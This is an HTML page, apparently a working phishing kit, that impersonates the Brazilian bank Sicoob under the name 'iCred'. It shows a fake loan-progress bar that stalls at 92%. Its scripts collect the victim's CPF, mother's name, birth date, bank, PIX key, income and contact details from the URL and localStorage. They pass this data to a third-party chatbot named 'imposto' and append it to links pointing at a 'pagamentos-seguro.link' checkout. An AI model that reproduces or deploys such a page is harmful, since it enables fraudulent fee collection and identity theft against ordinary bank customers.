<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Atendimento | iCred</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --sicoob-green: #00AE9D;
      --sicoob-dark: #003641;
      --progress-blue: #16a34a;
      --border-white: #FFFFFF;
    }

    html, body {
      margin: 0;
      padding: 0;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      font-family: 'Inter', sans-serif;
      background: #FFFFFF;
    }

    body {
      padding-top: 118px !important; 
    }

    .top-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 10000;
      background: #FFFFFF;
    }

    .header-main { 
      height: 64px;
      display: flex;
      align-items: center;
      padding: 0 16px;
      background: #FFFFFF;
      position: relative;
      z-index: 10001;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08); 
      box-sizing: border-box;
    }

    .header-content { 
      display: flex; 
      align-items: center; 
      justify-content: space-between; 
      width: 100%;
    }

    .header-left { display: flex; align-items: center; gap: 10px; }
    
    .menu-btn { 
      width: 36px; height: 36px; background: #F8F9FA; border-radius: 8px; 
      display: flex; align-items: center; justify-content: center; border: 1px solid #E5E7EB; 
    }

    .logo-img { height: 22px; width: auto; }

    .header-right { display: flex; align-items: center; gap: 8px; }

    .user-info { display: flex; flex-direction: column; align-items: flex-end; line-height: 1.1; }

    .user-name { 
      font-size: 11px; font-weight: 700; color: #111827; 
      text-transform: uppercase; white-space: nowrap;
    }

    .user-cpf { font-size: 10px; color: #6B7280; }

    .user-avatar {
      width: 34px; height: 34px; background: #DCFCE7; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      border: 1.5px solid #22C55E; color: #16A34A;
    }

    .progress-section {
      padding: 10px 16px 12px 16px;
      background: #FFFFFF;
      border-bottom: 1px solid var(--border-white);
      position: relative;
      z-index: 10000;
    }

    .progress-labels {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 6px;
    }

    .progress-text { font-size: 11px; font-weight: 600; color: var(--sicoob-dark); }

    .progress-pct { font-size: 12px; font-weight: 700; color: var(--progress-blue); }

    .progress-track {
      width: 100%; height: 6px; background: #F3F4F6; border-radius: 10px; overflow: hidden;
    }

    .progress-fill {
      height: 100%; 
      background: var(--progress-blue); 
      width: 0; 
      border-radius: 10px; 
    }

    typebot-standard {
      position: absolute;
      top: 118px !important;
      left: 0;
      width: 100%;
      height: calc(100vh - 118px) !important;
      z-index: 1;
    }
  </style>

  <script type="module">
  import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.78/dist/web.js';

  // LISTA MESTRE DE PARÂMETROS
  const chavesMestras = [
    'loanPurpose', 'occupation', 'monthlyIncome', 'paymentDay', 
    'education', 'cpfSituation', 'dueDate', 'nome_mae', 
    'data_nasc', 'cpf', 'nome', 'banco', 'chave_pix', 
    'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment',
    'email', 'telephone', 'utm_source', 'utm_medium', 'utm_campaign', 
    'utm_content', 'utm_term', 'src', 'sck'
  ];

  function capturarDadosCompletos() {
    const urlParams = new URLSearchParams(window.location.search);
    const dadosFinais = {};

    // 1. Busca no LocalStorage
    chavesMestras.forEach(key => {
      const savedValue = localStorage.getItem(key);
      if (savedValue) dadosFinais[key] = savedValue;
    });

    // 2. Sobrepõe com a URL atual
    for (const [key, value] of urlParams) {
      dadosFinais[key] = value;
      localStorage.setItem(key, value);
    }

    // 3. RECONSTRUÇÃO DA URL (Mantém a "Parte Azul" visível no navegador)
    if (!urlParams.has('nome') && dadosFinais['nome']) {
      const novaQuery = new URLSearchParams();
      Object.keys(dadosFinais).forEach(key => {
        if (dadosFinais[key]) novaQuery.set(key, dadosFinais[key]);
      });
      const novoLink = window.location.pathname + '?' + novaQuery.toString();
      window.history.replaceState(null, '', novoLink);
    }

    // Formatação de valor para o Typebot
    let loanValue = dadosFinais['valor_saque'] || dadosFinais['selectedLoanAmount'] || dadosFinais['valor'];
    if (loanValue && !isNaN(parseFloat(loanValue))) {
      dadosFinais['valor'] = parseFloat(loanValue).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
    }

    return dadosFinais;
  }

  const variaveisParaTypebot = capturarDadosCompletos();

  Typebot.initStandard({
    typebot: "imposto",
    apiHost: "https://type-typebot-viewer.g9fpzt.easypanel.host",
    prefilledVariables: variaveisParaTypebot
  });
</script>
</head>

<body>

  <div class="top-container">
    <header class="header-main">
      <div class="header-content">
        <div class="header-left">
          <div class="menu-btn">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.5"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
          </div>
          <img src="https://sicredseguro.vercel.app/images/sicoob-logo-1.png" class="logo-img" alt="Sicoob">
        </div>
        <div class="header-right">
          <div class="user-info">
            <span class="user-name" id="userName">Usuário</span>
            <span class="user-cpf" id="userCpf">***.***.***-**</span>
          </div>
          <div class="user-avatar">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="18" height="18"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
          </div>
        </div>
      </div>
    </header>

    <div class="progress-section">
      <div class="progress-labels">
        <span class="progress-text">Empréstimo em Andamento...</span>
        <span class="progress-pct" id="pct-text">0%</span>
      </div>
      <div class="progress-track">
        <div class="progress-fill" id="bar-fill"></div>
      </div>
    </div>
  </div>

  <typebot-standard></typebot-standard>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      // 1. Captura de dados prioritária da URL para a Header
      const urlParams = new URLSearchParams(window.location.search);
      
      // Busca NOME na URL ou LocalStorage
      const nome = urlParams.get('nome') || localStorage.getItem('nome');
      if (nome) {
        const nomes = nome.trim().split(' ');
        document.getElementById('userName').textContent = nomes.length > 1 
          ? `${nomes[0]} ${nomes[nomes.length - 1]}`.toUpperCase() 
          : nomes[0].toUpperCase();
      }
      
      // Busca CPF na URL ou LocalStorage
      const cpf = urlParams.get('cpf') || localStorage.getItem('cpf');
      if (cpf) {
        const cl = cpf.replace(/\D/g, '');
        if (cl.length === 11) {
          document.getElementById('userCpf').textContent = `${cl.substring(0, 3)}.***.***-${cl.substring(9, 11)}`;
        }
      }

      // 2. Animação da Barra de Progresso
      function startProgress() {
        const bar = document.getElementById('bar-fill');
        const text = document.getElementById('pct-text');
        
        if (!bar || !text) return;

        let val = 0;
        const target = 92;

        const interval = setInterval(() => {
          if (val >= target) {
            clearInterval(interval);
          } else {
            val++;
            bar.style.width = val + '%';
            text.textContent = val + '%';
          }
        }, 30); 
      }

      setTimeout(startProgress, 500);
    });
  </script>

  <script>
  // FUNÇÃO PARA GARANTIR QUE O LINK DE CHECKOUT NO TYPEBOT LEVE TODOS OS PARÂMETROS
  function prepararBotaoCheckout() {
    const paramsAtuais = window.location.search;
    if (!paramsAtuais) return;

    const links = document.querySelectorAll('a[href*="pagamentos-seguro.link"]');

    links.forEach(link => {
      if (!link.href.includes('loanPurpose=')) {
        const baseUrl = link.href.split('?')[0];
        const separador = baseUrl.includes('?') ? '&' : '?';
        link.href = baseUrl + separador + paramsAtuais.substring(1);
        console.log("Botão de Checkout sincronizado com a URL.");
      }
    });
  }

  const observer = new MutationObserver(() => {
    prepararBotaoCheckout();
  });

  observer.observe(document.body, {
    childList: true,
    subtree: true
  });

  setInterval(prepararBotaoCheckout, 1000);
</script>
</body>
</html>
